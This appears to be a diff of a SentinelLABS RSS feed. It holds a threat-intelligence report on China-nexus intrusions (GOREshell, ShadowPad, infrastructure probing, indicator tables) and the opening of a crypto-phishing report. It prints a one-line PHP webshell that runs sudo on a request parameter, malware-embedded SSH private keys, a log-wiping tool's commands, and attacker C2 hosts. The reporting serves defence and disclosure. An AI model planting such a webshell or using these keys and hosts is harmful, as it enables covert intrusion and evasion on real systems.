+<figure id="attachment_123752" aria-describedby="caption-attachment-123752" style="width: 488px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_1.jpg" alt="Network request issued by glib-2.0.dll" width="488" height="176" class="size-full wp-image-123752" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_1.jpg 488w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_1-300x108.jpg 300w" sizes="auto, (max-width: 488px) 100vw, 488px" /><figcaption id="caption-attachment-123752" class="wp-caption-text">Network request issued by <em>glib-2.0.dll</em></figcaption></figure>
+<p>The threat actor deployed GOREshell variants not only on Windows systems but also on Linux. This includes two samples: one masquerading as the <code>snapd</code> Linux service and the other as the <code>update-notifier</code> service. The threat actor deployed both samples as Linux services, which included creating service configuration files, such as <code>/usr/lib/systemd/system/update-notifier.service</code>.</p>
+<figure id="attachment_123749" aria-describedby="caption-attachment-123749" style="width: 590px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_12.jpg" alt="The content of update-notifier.service" width="590" height="311" class="size-full wp-image-123749" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_12.jpg 590w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_12-300x158.jpg 300w" sizes="auto, (max-width: 590px) 100vw, 590px" /><figcaption id="caption-attachment-123749" class="wp-caption-text">The content of <em>update-notifier.service</em></figcaption></figure>
+<p>In contrast to <code>update-notifier</code>, which is obfuscated using Garble and packed with UPX, <code>snapd</code> is not obfuscated. Both samples use <code>epp.navy[.]ddns[.]info</code> as their C2 servers and are configured to proxy connections through a local IP address over port 8080. Additionally, both samples store the same private SSH key as <code>glib-2.0.dll</code>.</p>
+<p>Based on the private key stored in <code>glib-2.0.dll</code>, <code>snapd</code>, and <code>update-notifier</code>, we discovered an additional GOREshell variant, which was uploaded on a malware sharing platform in September 2023. This GOREshell variant is implemented as a <code>tapisrv.dll</code> library file (Microsoft Windows Telephony Server) and loaded as a Windows service by the <code>svchost.exe</code> service container process. The malware uses the <code>mail.ccna[.]organiccrap[.]com</code> domain for C2 purposes.</p>
+<p>The discovery of the <code>tapisrv.dll</code> sample indicates reuse of the private key in intrusions separated by a considerable period.</p>
+<figure id="attachment_123740" aria-describedby="caption-attachment-123740" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_9.jpg" alt="Private key reuse" width="1999" height="1150" class="size-full wp-image-123740" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_9.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_9-300x173.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_9-1024x589.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_9-768x442.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_9-1536x884.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-123740" class="wp-caption-text">Private key reuse</figcaption></figure>
+<p>We associate some of the GOREshell C2 infrastructure with an ORB network, which we track as being operated from China and actively used by several suspected Chinese cyberespionage actors, including overlaps with APT15.</p>
+<p>The threat actor made significant efforts to obscure their activity and remove evidence of their presence, including timestomping GOREshell executable files and deploying a log removal tool on Linux systems, specifically at the <code>/usr/sbin/mcl</code> filepath.</p>
+<p>Our analysis of <code>mcl</code> suggests that the executable is likely a compiled and modified version of the source code of a tool called <code>clear13</code>, developed by members of The Hacker&#8217;s Choice community. The source code of <code>clear13</code> is <a href="https://github.com/hackerschoice/THC-Archive/tree/master/Tools" target="_blank" rel="noopener noreferrer">publicly available</a> on GitHub.</p>
+<p>The <code>mcl</code> executable is packed using a custom-modified version of UPX. The tool supports four commands, which are presented to the user through a help menu.</p>
+<div style="overflow-x:auto;">
+<table style="border-collapse: collapse; width: 100%; height: 120px;">
+<tbody>
+<tr style="height: 24px;">
+<td style="width: 25.0%; height: 24px;"><strong>Command</strong></td>
+<td style="width: 25.0%; height: 24px;"><strong>Displayed help text</strong></td>
+<td style="width: 50.0%; height: 24px;"><strong>Description</strong></td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 25.0%; height: 24px;">sudo</td>
+<td style="width: 25.0%; height: 24px;">sudo cmd</td>
+<td style="width: 50.0%; height: 24px;">Executes a specified command (<code>cmd</code>) with elevated privileges using <code>sudo</code>.</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 25.0%; height: 24px;">clear</td>
+<td style="width: 25.0%; height: 24px;">clear name</td>
+<td style="width: 50.0%; height: 24px;">Removes the last entry containing a specified username (<code>name</code>) from <code>/var/log/wtmp</code>, <code>/var/run/utmp</code>, and <code>/var/log/lastlog</code>.</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 25.0%; height: 24px;">secure</td>
+<td style="width: 25.0%; height: 24px;">secure timeString</td>
+<td style="width: 50.0%; height: 24px;">Removes all entries matching a specified pattern (<code>timeString</code>) from <code>/var/log/secure</code>.</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 25.0%; height: 24px;">history</td>
+<td style="width: 25.0%; height: 24px;">history leftNum</td>
+<td style="width: 50.0%; height: 24px;">Truncates the user command history, keeping only a specified number of entries (<code>leftNum</code>).</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3>Activity E | Probing &amp; Reconnaissance of SentinelOne Infrastructure</h3>
+<p>In October 2024, SentinelLABS observed consistent attempts to establish remote connections to multiple Internet-facing SentinelOne servers over port 443 for reconnaissance purposes.</p>
+<p>Our analysis of the infrastructure associated with this activity revealed links to the October 2024 intrusion into the South Asian government entity (Activity D).</p>
+<p>We identified server characteristics and domain registration patterns suggesting coordinated infrastructure management and bulk domain registration, likely carried out by the same threat actor conducting reconnaissance on SentinelOne infrastructure and involved in Activity D, or by a third-party entity responsible for managing the infrastructure used in both activities.</p>
+<p>The connections we initially observed originated from a virtual private server (VPS) that used a C2 server as a proxy. At the time of the activity, the server had an IP address of <code>128.199.124[.]136</code>, which was mapped to the domain name <code>tatacom.duckdns[.]org</code> and is designed to appear as part of a major South Asian telecommunications provider’s infrastructure.</p>
+<p>Based on a unique server fingerprint, SentinelLABS discovered an extensive collection of related network infrastructure.</p>
+<figure id="attachment_123748" aria-describedby="caption-attachment-123748" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_13.jpg" alt="Infrastructure overview" width="1999" height="1567" class="size-full wp-image-123748" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_13.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_13-300x235.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_13-1024x803.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_13-768x602.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_13-1536x1204.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-123748" class="wp-caption-text">Infrastructure overview</figcaption></figure>
+<p>The C2 domain <code>downloads.trendav[.]vip</code>, observed in Activity D, resolved to the IP address <code>142.93.214[.]219</code>. We also identified this IP address based on the server fingerprint. Furthermore, the IP address of a server associated with the same fingerprint, <code>143.244.137[.]54</code>, was mapped to the domain name <code>cloud.trendav[.]co</code> in October 2024. This domain name overlaps with <code>downloads.trendav[.]vip</code>.</p>
+<p>Additionally, historical domain registration records show that the root domain <code>trendav[.]vip</code> was originally registered through Dynadot Inc., on 24 October 2023, at 13:05:29 UTC. Identifying all domains registered through the same registrar at the exact same date and time (to the second) reveals the domains <code>secmailbox[.]us</code> and <code>sentinelxdr[.]us</code>, the latter of which likely masquerades as SentinelOne infrastructure.</p>
+<p>Between February and April 2025, the <code>sentinelxdr[.]us</code> domain resolved to <code>142.93.214[.]219</code>, the same IP address that <code>downloads.trendav[.]vip</code> resolved to in October 2024.</p>
+<p>In October 2024, <code>mail.secmailbox[.]us</code> resolved to <code>142.93.212[.]42</code>. Like the server at IP address <code>142.93.214[.]219</code> (<code>downloads.trendav[.]vip/sentinelxdr[.]us</code>), this server shared the same server fingerprint.</p>
+<p>Furthermore, domain registration data for <code>sentinelxdr[.]us</code> was updated on 25 September 2024, at 01:43:46 UTC, a date and time that is identical to an update of the registration data of <code>trendav[.]vip</code>.</p>
+<h3>Activity F | The Return of dsniff</h3>
+<p>The late September 2024 intrusion into the European media organization showed overlaps in tooling with the October 2024 intrusion into the South Asian government entity (Activity D). These overlaps include the use of the GOREshell backdoor and publicly available tools developed by The Hacker’s Choice community.</p>
+<p>The threat actor deployed a UPX-packed GOREshell sample, which was configured to use <code>107.173.111[.]26</code> over the WebSocket protocol for C2 communication (<code>wss[://]107.173.111[.]26:443</code>). The executable file we retrieved contains a private SSH key and the public SSH key fingerprint <code>f0746e78e49896dfa01c674bf2a800443b1966c54663db5c679bc86533352590</code>.</p>
+<pre>
+-----BEGIN PRIVATE KEY-----
+MC4CAQAwBQYDK2VwBCIEIMsHXDEWgXiPFrIjDOSXZqReC2HHiS6kgoZT0YgHlK87
+-----END PRIVATE KEY-----
+</pre>
+<p>Based on the fingerprint, we identified a Garble-obfuscated GOREshell sample that was uploaded to a malware sharing platform from Iran in late July 2024. This GOREshell sample also contains a private SSH key and is configured to use the same C2 server, <code>107.173.111[.]26</code>, over the TLS protocol (<code>tls[://]107.173.111[.]26:80</code>).</p>
+<p>This suggests threat actor activity since at least July 2024, possibly targeting organizations in both Europe and the Middle East.</p>
+<pre>
+-----BEGIN PRIVATE KEY-----
+MC4CAQAwBQYDK2VwBCIEINArpOAwJO2+lv9Da+PzmkbKxGhMcapQ+/NhUq4nifvh
+-----END PRIVATE KEY-----
+</pre>
+<p>The threat actor also deployed version 2.5a1 of <a href="https://www.monkey.org/~dugsong/dsniff/" target="_blank" rel="noopener noreferrer">dsniff</a>, a collection of tools for network auditing and penetration testing. With active development of <code>dsniff</code> having been discontinued for over 15 years, our investigation of public source code repositories revealed that the THC community has <a href="https://github.com/hackerschoice/dsniff" target="_blank" rel="noopener noreferrer">released version 2.5a1</a> in an effort to resume active maintenance of the project.</p>
+<p>To obfuscate their presence, the threat actor timestomped deployed executables, setting their creation date to September 15, 2021. After gaining initial access to the environment, the perpetrators deployed a simple PHP webshell that enables remote command execution by passing commands via the <code>a</code> parameter and executing them with elevated privileges using <code>sudo</code>.</p>
+<pre>
+&lt;?php system('/bin/sudo '. @$_REQUEST['a']);?>
+</pre>
+<p>Our investigation of system and network traffic artifacts strongly suggests that the threat actor gained an initial foothold by exploiting <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8963" target="_blank" rel="noopener noreferrer">CVE-2024-8963</a> in conjunction with <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8190" target="_blank" rel="noopener noreferrer">CVE-2024-8190</a> (both Ivanti Cloud Services Appliance vulnerabilities) on September 5, 2024, a few days before their public disclosure.</p>
+<p>We track some of the malicious infrastructure used in this attack as part of an ORB network, which we suspect is operated from China and includes compromised network edge devices.</p>
+<h2>Conclusions</h2>
+<p>This post highlights the persistent threat posed by China-nexus cyberespionage actors to a wide range of industries and public sector organizations, including cybersecurity vendors themselves. The activities detailed in this research reflect the strong interest these actors have in the very organizations tasked with defending digital infrastructure.</p>
+<p>Our findings underscore the critical need for constant vigilance, robust monitoring, and rapid response capabilities. By publicly sharing details of our investigations, we aim to provide insight into the rarely discussed targeting of cybersecurity vendors, helping to destigmatize sharing of IOCs related to these campaigns, and thus contribute to a deeper understanding of the tactics, objectives, and operational patterns of China-nexus threat actors. As these adversaries continue to adapt to our response efforts, it’s essential that defenders prioritize transparency, intelligence sharing, and coordinated action over the fear of reputational harm.</p>
+<p>We encourage others in the industry to adopt a proactive approach to threat intelligence sharing and defense coordination, recognizing that collective security strengthens the entire community.</p>
+<p>We are grateful to our partners at Lumen Technologies Black Lotus Labs for their collaboration and support.</p>
+<h2>Indicators of Compromise</h2>
+<h3>SHA-1 Hashes</h3>
+<div style="overflow-x:auto;">
+<table style="border-collapse: collapse; width: 100%; height: 120px;">
+<tbody>
+<tr style="height: 24px;">
+<td style="width: 65.0%; height: 24px;"><strong>Value</strong></td>
+<td style="width: 35.0%; height: 24px;"><strong>Note</strong></td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 65.0%; height: 24px;">106248206f1c995a76058999ccd6a6d0f420461e</td>
+<td style="width: 35.0%; height: 24px;">Webshell</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 65.0%; height: 24px;">411180c89953ab5e0c59bd4b835eef740b550823</td>
+<td style="width: 35.0%; height: 24px;">GOREshell (snapd)</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 65.0%; height: 24px;">4896cfff334f846079174d3ea2d541eec72690a0</td>
+<td style="width: 35.0%; height: 24px;">Nimbo-C2 agent (PfSvc.exe)</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 65.0%; height: 24px;">5ee4be6f82a16ebb1cf8f35481c88c2559e5e41a</td>
+<td style="width: 35.0%; height: 24px;">ShadowPad</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 65.0%; height: 24px;">7dabf87617d646a9ec3e135b5f0e5edae50cd3b9</td>
+<td style="width: 35.0%; height: 24px;">GOREshell (update-notifier)</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 65.0%; height: 24px;">a31642046471ec138bb66271e365a01569ff8d7f</td>
+<td style="width: 35.0%; height: 24px;">GOREshell</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 65.0%; height: 24px;">a88f34c0b3a6df683bb89058f8e7a7d534698069</td>
+<td style="width: 35.0%; height: 24px;">ShadowPad</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 65.0%; height: 24px;">aa6a9c25aff0e773d4189480171afcf7d0f69ad9</td>
+<td style="width: 35.0%; height: 24px;">ShadowPad</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 65.0%; height: 24px;">c43b0006b3f7cd88d31aded8579830168a44ba79</td>
+<td style="width: 35.0%; height: 24px;">ShadowPad</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 65.0%; height: 24px;">cb2d18fb91f0cd88e82cb36b614cfedf3e4ae49b</td>
+<td style="width: 35.0%; height: 24px;">GOREshell (glib-2.0.dll)</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 65.0%; height: 24px;">cbe82e23f8920512b1cf56f3b5b0bca61ec137b9</td>
+<td style="width: 35.0%; height: 24px;">Legitimate VMWare executable (VGAuthService.exe)</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 65.0%; height: 24px;">ebe6068e2161fe359a63007f9febea00399d7ef3</td>
+<td style="width: 35.0%; height: 24px;">GOREshell</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 65.0%; height: 24px;">f52e18b7c8417c7573125c0047adb32d8d813529</td>
+<td style="width: 35.0%; height: 24px;">ShadowPad (AppSov.exe)</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3>Domains</h3>
+<div style="overflow-x:auto;">
+<table style="border-collapse: collapse; width: 100%; height: 120px;">
+<tbody>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;"><strong>Value</strong></td>
+<td style="width: 50.0%; height: 24px;"><strong>Note</strong></td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">cloud.trendav[.]co</td>
+<td style="width: 50.0%; height: 24px;">Suspected PurpleHaze infrastructure</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">downloads.trendav[.]vip</td>
+<td style="width: 50.0%; height: 24px;">GOREshell C2 server</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">dscriy.chtq[.]net</td>
+<td style="width: 50.0%; height: 24px;">ShadowPad C2 server</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">epp.navy[.]ddns[.]info</td>
+<td style="width: 50.0%; height: 24px;">GOREshell C2 server</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">mail.ccna[.]organiccrap[.]com</td>
+<td style="width: 50.0%; height: 24px;">GOREshell C2 server</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">mail.secmailbox[.]us</td>
+<td style="width: 50.0%; height: 24px;">Suspected PurpleHaze infrastructure</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">network.oossafe[.]com</td>
+<td style="width: 50.0%; height: 24px;">Suspected ShadowPad C2 server</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">news.imaginerjp[.]com</td>
+<td style="width: 50.0%; height: 24px;">ShadowPad C2 server</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">notes.oossafe[.]com</td>
+<td style="width: 50.0%; height: 24px;">Suspected ShadowPad C2 server</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">secmailbox[.]us</td>
+<td style="width: 50.0%; height: 24px;">Suspected PurpleHaze infrastructure</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">sentinelxdr[.]us</td>
+<td style="width: 50.0%; height: 24px;">Suspected PurpleHaze infrastructure</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">tatacom.duckdns[.]org</td>
+<td style="width: 50.0%; height: 24px;">C2 server</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">trendav[.]vip</td>
+<td style="width: 50.0%; height: 24px;">Suspected PurpleHaze infrastructure</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">updata.dsqurey[.]com</td>
+<td style="width: 50.0%; height: 24px;">ShadowPad C2 server</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3>IP Addresses</h3>
+<div style="overflow-x:auto;">
+<table style="border-collapse: collapse; width: 100%; height: 120px;">
+<tbody>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;"><strong>Value</strong></td>
+<td style="width: 50.0%; height: 24px;"><strong>Note</strong></td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">103.248.61[.]36</td>
+<td style="width: 50.0%; height: 24px;">Malware hosting location</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">107.173.111[.]26</td>
+<td style="width: 50.0%; height: 24px;">GOREshell C2 server</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">128.199.124[.]136</td>
+<td style="width: 50.0%; height: 24px;">C2 server</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">142.93.212[.]42</td>
+<td style="width: 50.0%; height: 24px;">Suspected PurpleHaze infrastructure</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">142.93.214[.]219</td>
+<td style="width: 50.0%; height: 24px;">GOREshell C2 server</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">143.244.137[.]54</td>
+<td style="width: 50.0%; height: 24px;">Suspected PurpleHaze infrastructure</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">45.13.199[.]209</td>
+<td style="width: 50.0%; height: 24px;">Exfiltration IP address</td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">65.38.120[.]110</td>
+<td style="width: 50.0%; height: 24px;">ShadowPad C2 server</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3>URLs</h3>
+<div style="overflow-x:auto;">
+<table style="border-collapse: collapse; width: 100%; height: 120px;">
+<tbody>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;"><strong>Value</strong></td>
+<td style="width: 50.0%; height: 24px;"><strong>Note</strong></td>
+</tr>
+<tr style="height: 24px;">
+<td style="width: 50.0%; height: 24px;">https[://]45.13.199[.]209/rss/rss.php</td>
+<td style="width: 50.0%; height: 24px;">Exfiltration URL</td>
+</tr>
+</tbody>
+</table>
+</div>
+]]></content:encoded>
+					
+		
+		
+		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_header-scaled.jpg" length="" type="image/jpeg" />	</item>
+		<item>
 		<title>FreeDrain Unmasked &#124; Uncovering an Industrial-Scale Crypto Theft Network</title>
 		<link>https://www.sentinelone.com/labs/freedrain-unmasked-uncovering-an-industrial-scale-crypto-theft-network/</link>
 		
@@ -44,7 +446,7 @@
 <p>Our findings highlight the growing sophistication of financially motivated threat actors and the systemic risks posed by under-moderated publishing platforms. This research underscores the need for adaptive detection, proactive monitoring, and tighter safeguards across the ecosystem to disrupt threats like FreeDrain before they scale.</p>
 <h2>The Plea for Help</h2>
 <p>Our investigation into what would become the <i>FreeDrain</i> Network began on May 12, 2024, when Validin received a message from a distressed individual who had lost approximately 8 BTC, worth around $500,000 at the time. The victim had unknowingly submitted their wallet seed phrase to a phishing site while attempting to check their wallet balance, after clicking on a highly-ranked search engine result.</p>
-<figure id="attachment_121004" aria-describedby="caption-attachment-121004" style="width: 1007px" class="wp-caption aligncenter"><img fetchpriority="high" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9.jpg" alt="Request for help after successful phish" width="1007" height="333" class="size-full wp-image-121004" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9.jpg 1007w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9-300x99.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9-768x254.jpg 768w" sizes="(max-width: 1007px) 100vw, 1007px" /><figcaption id="caption-attachment-121004" class="wp-caption-text">Request for help after successful phish</figcaption></figure>
+<figure id="attachment_121004" aria-describedby="caption-attachment-121004" style="width: 1007px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9.jpg" alt="Request for help after successful phish" width="1007" height="333" class="size-full wp-image-121004" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9.jpg 1007w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9-300x99.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_9-768x254.jpg 768w" sizes="auto, (max-width: 1007px) 100vw, 1007px" /><figcaption id="caption-attachment-121004" class="wp-caption-text">Request for help after successful phish</figcaption></figure>
 <p>The individual had come across a Validin blog post from April 2024, <a href="https://www.validin.com/blog/unmasking-crypto-phishing-websites-with-validin/" target="_blank" rel="noopener noreferrer">which documented a series of crypto-draining phishing pages</a>. The phishing site they encountered shared striking similarities to the infrastructure we had analyzed—specifically, pages hosted on <code>azurewebsites[.]net</code>, along with additional dedicated domain names.</p>
 <p>Trusted cryptocurrency tracking analysts confirmed that the destination wallet used to receive the victim’s funds was a one-time-use address. The stolen assets were quickly moved through a cryptocurrency mixer, an obfuscation method that fragments and launders funds across multiple transactions, making attribution and recovery nearly impossible.</p>
 <p>While we weren’t able to assist in recovering the lost assets, this outreach marked a turning point. It became clear that the incident was not isolated. We set out to uncover the infrastructure behind the scam and understand the broader operation enabling these thefts to occur at scale.</p>
@@ -53,8 +455,8 @@
 <p>That changed with the report from the victim in May. They had encountered the phishing site via a top-ranked search engine result, not a suspicious message or unsolicited link.</p>
 <p>Curious whether we could reproduce the victim’s experience, we conducted a series of keyword searches ourselves. The results were startling.</p>
 <p>Search terms like &#8220;<i>Trezor wallet balance</i>&#8221; returned multiple malicious results across Google, Bing, and DuckDuckGo, often within the first few result pages.</p>
-<p><figure id="attachment_121024" aria-describedby="caption-attachment-121024" style="width: 1504px" class="wp-caption aligncenter"><img decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13.jpg" alt="Trezor Wallet Balance malicious result in DuckDuckGo" width="1504" height="1131" class="size-full wp-image-121024" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13.jpg 1504w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-1024x770.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-768x578.jpg 768w" sizes="(max-width: 1504px) 100vw, 1504px" /><figcaption id="caption-attachment-121024" class="wp-caption-text">Trezor Wallet Balance malicious result in DuckDuckGo</figcaption></figure><br />
-<figure id="attachment_121010" aria-describedby="caption-attachment-121010" style="width: 1498px" class="wp-caption aligncenter"><img decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3.jpg" alt="Trezor Wallet Balance malicious result in top Bing Search" width="1498" height="1130" class="size-full wp-image-121010" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3.jpg 1498w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-1024x772.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-768x579.jpg 768w" sizes="(max-width: 1498px) 100vw, 1498px" /><figcaption id="caption-attachment-121010" class="wp-caption-text">Trezor Wallet Balance malicious result in top Bing Search</figcaption></figure><br />
+<p><figure id="attachment_121024" aria-describedby="caption-attachment-121024" style="width: 1504px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13.jpg" alt="Trezor Wallet Balance malicious result in DuckDuckGo" width="1504" height="1131" class="size-full wp-image-121024" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13.jpg 1504w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-1024x770.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_13-768x578.jpg 768w" sizes="auto, (max-width: 1504px) 100vw, 1504px" /><figcaption id="caption-attachment-121024" class="wp-caption-text">Trezor Wallet Balance malicious result in DuckDuckGo</figcaption></figure><br />
+<figure id="attachment_121010" aria-describedby="caption-attachment-121010" style="width: 1498px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3.jpg" alt="Trezor Wallet Balance malicious result in top Bing Search" width="1498" height="1130" class="size-full wp-image-121010" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3.jpg 1498w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-1024x772.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_3-768x579.jpg 768w" sizes="auto, (max-width: 1498px) 100vw, 1498px" /><figcaption id="caption-attachment-121010" class="wp-caption-text">Trezor Wallet Balance malicious result in top Bing Search</figcaption></figure><br />
 <figure id="attachment_121007" aria-describedby="caption-attachment-121007" style="width: 1142px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596.jpg" alt="Trezor Wallet Balance malicious result in Top Google Search result" width="1142" height="774" class="size-full wp-image-121007" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596.jpg 1142w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596-300x203.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596-1024x694.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_6-e1746193513596-768x521.jpg 768w" sizes="auto, (max-width: 1142px) 100vw, 1142px" /><figcaption id="caption-attachment-121007" class="wp-caption-text">Trezor Wallet Balance malicious result in Top Google Search result</figcaption></figure></p>
 <p>These were not obscure or poorly maintained phishing sites; they were professionally crafted lure pages freely hosted on subdomains of trusted platforms like <code>gitbook.io</code>, <code>webflow.io</code>, and <code>github.io</code>.</p>
 <p>This discovery marked our first real glimpse into the scale and sophistication of the FreeDrain campaign—and raised a host of new questions. Specifically, what is the overall workflow once a victim visits the site, how are these pages becoming so highly ranked, and what can we discover about the attackers themselves?</p>
@@ -777,7 +1179,7 @@ document.addEventListener("DOMContentLoaded", function () {
 					
 		
 		
-		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/05/CryptoDrain-soc.jpg" length="969572" type="image/jpeg" />	</item>
+		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/05/CryptoDrain-soc.jpg" length="" type="image/jpeg" />	</item>
 		<item>
 		<title>Top Tier Target &#124; What It Takes to Defend a Cybersecurity Company from Today&#8217;s Adversaries</title>
 		<link>https://www.sentinelone.com/labs/top-tier-target-what-it-takes-to-defend-a-cybersecurity-company-from-todays-adversaries/</link>
@@ -889,7 +1291,7 @@ Organizations should refine their threat modeling processes to explicitly accoun
 					
 		
 		
-		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTier_soc_ftr.jpg" length="224159" type="image/jpeg" />	</item>
+		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTier_soc_ftr.jpg" length="" type="image/jpeg" />	</item>
 		<item>
